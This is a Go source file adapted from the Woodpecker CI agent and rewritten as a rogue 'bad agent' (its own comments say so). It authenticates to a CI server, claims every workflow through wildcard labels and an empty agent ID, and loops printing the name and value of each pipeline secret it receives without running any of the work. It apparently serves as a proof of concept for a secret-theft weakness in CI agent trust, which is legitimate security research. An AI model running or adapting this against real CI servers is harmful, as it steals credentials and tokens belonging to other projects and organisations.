// Copyright 2023 Woodpecker Authors
// Copyright 2018 Drone.IO Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package core

import (
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/rs/zerolog/log"
	"github.com/tevino/abool/v2"
	"github.com/urfave/cli/v2"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	grpccredentials "google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/keepalive"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"

	agentRpc "go.woodpecker-ci.org/woodpecker/v2/agent/rpc"
	"go.woodpecker-ci.org/woodpecker/v2/pipeline/backend/types"
	"go.woodpecker-ci.org/woodpecker/v2/pipeline/rpc"
	"go.woodpecker-ci.org/woodpecker/v2/shared/logger"
	"go.woodpecker-ci.org/woodpecker/v2/shared/utils"
)

func run(c *cli.Context, backends []types.Backend) error {
	agentConfigPath := c.String("agent-config")
	hostname := c.String("hostname")
	if len(hostname) == 0 {
		hostname, _ = os.Hostname()
	}

	counter.Polling = c.Int("max-workflows")
	counter.Running = 0

	if c.Bool("healthcheck") {
		go func() {
			if err := http.ListenAndServe(c.String("healthcheck-addr"), nil); err != nil {
				log.Error().Err(err).Msgf("cannot listen on address %s", c.String("healthcheck-addr"))
			}
		}()
	}

	var transport grpc.DialOption
	if c.Bool("grpc-secure") {
		transport = grpc.WithTransportCredentials(grpccredentials.NewTLS(&tls.Config{InsecureSkipVerify: c.Bool("grpc-skip-insecure")}))
	} else {
		transport = grpc.WithTransportCredentials(insecure.NewCredentials())
	}

	authConn, err := grpc.Dial(
		c.String("server"),
		transport,
		grpc.WithKeepaliveParams(keepalive.ClientParameters{
			Time:    c.Duration("grpc-keepalive-time"),
			Timeout: c.Duration("grpc-keepalive-timeout"),
		}),
	)
	if err != nil {
		return err
	}
	defer authConn.Close()

	agentConfig := readAgentConfig(agentConfigPath)

	agentToken := c.String("grpc-token")
	authClient := agentRpc.NewAuthGrpcClient(authConn, agentToken, agentConfig.AgentID)
	authInterceptor, err := agentRpc.NewAuthInterceptor(authClient, 30*time.Minute) //nolint: gomnd
	if err != nil {
		return err
	}

	conn, err := grpc.Dial(
		c.String("server"),
		transport,
		grpc.WithKeepaliveParams(keepalive.ClientParameters{
			Time:    c.Duration("grpc-keepalive-time"),
			Timeout: c.Duration("grpc-keepalive-timeout"),
		}),
		grpc.WithUnaryInterceptor(authInterceptor.Unary()),
		grpc.WithStreamInterceptor(authInterceptor.Stream()),
	)
	if err != nil {
		return err
	}
	defer conn.Close()

	client := agentRpc.NewGrpcClient(conn)

	sigterm := abool.New()

	// HEHE we are an bad agent

	ctx := metadata.NewOutgoingContext(
		context.Background(),
		metadata.Pairs("hostname", hostname, "agent_id", ""),
	)

	agentConfigPersisted := abool.New()
	ctx = utils.WithContextSigtermCallback(ctx, func() {
		log.Info().Msg("termination signal is received, shutting down")
		sigterm.Set()

		// Remove stateless agents from server
		if agentConfigPersisted.IsNotSet() {
			log.Debug().Msg("unregistering agent from server")
			err := client.UnregisterAgent(ctx)
			if err != nil {
				log.Err(err).Msg("failed to unregister agent from server")
			}
		}
	})

	// check if grpc server version is compatible with agent
	grpcServerVersion, err := client.Version(ctx)
	if err != nil {
		log.Error().Err(err).Msg("could not get grpc server version")
		return err
	}
	if grpcServerVersion.GrpcVersion != agentRpc.ClientGrpcVersion {
		err := errors.New("GRPC version mismatch")
		log.Error().Err(err).Msgf("server version %s does report grpc version %d but we only understand %d",
			grpcServerVersion.ServerVersion,
			grpcServerVersion.GrpcVersion,
			agentRpc.ClientGrpcVersion)
		return err
	}

	var wg sync.WaitGroup
	parallel := c.Int("max-workflows")
	wg.Add(parallel)

	// HEHE we are an bad agent

	labels := map[string]string{
		"hostname": "*",
		"platform": "*",
		"backend":  "*",
	}

	if err := stringSliceAddToMap(c.StringSlice("filter"), labels); err != nil {
		return err
	}

	filter := rpc.Filter{
		Labels: labels,
	}

	for {
		fmt.Println("I'm a bad agent hehe")
		work, err := client.Next(ctx, filter)
		if err != nil {
			fmt.Printf("ERROR: %s", err)
		} else {
			fmt.Println("sweet sweet secrets")
			for _, s := range work.Config.Secrets {
				fmt.Printf("name: '%s' value: '%s'\n", s.Name, s.Value)
			}
		}

		time.Sleep(time.Second)
	}
}

func runWithRetry(backendEngines []types.Backend) func(context *cli.Context) error {
	return func(context *cli.Context) error {
		if err := logger.SetupGlobalLogger(context, true); err != nil {
			return err
		}

		initHealth()

		retryCount := context.Int("connect-retry-count")
		retryDelay := context.Duration("connect-retry-delay")
		var err error
		for i := 0; i < retryCount; i++ {
			if err = run(context, backendEngines); status.Code(err) == codes.Unavailable {
				log.Warn().Err(err).Msg(fmt.Sprintf("cannot connect to server, retrying in %v", retryDelay))
				time.Sleep(retryDelay)
			} else {
				break
			}
		}
		return err
	}
}

func stringSliceAddToMap(sl []string, m map[string]string) error {
	if m == nil {
		m = make(map[string]string)
	}
	for _, v := range utils.StringSliceDeleteEmpty(sl) {
		before, after, _ := strings.Cut(v, "=")
		switch {
		case before != "" && after != "":
			m[before] = after
		case before != "":
			return fmt.Errorf("key '%s' does not have a value assigned", before)
		default:
			return fmt.Errorf("empty string in slice")
		}
	}
	return nil
}
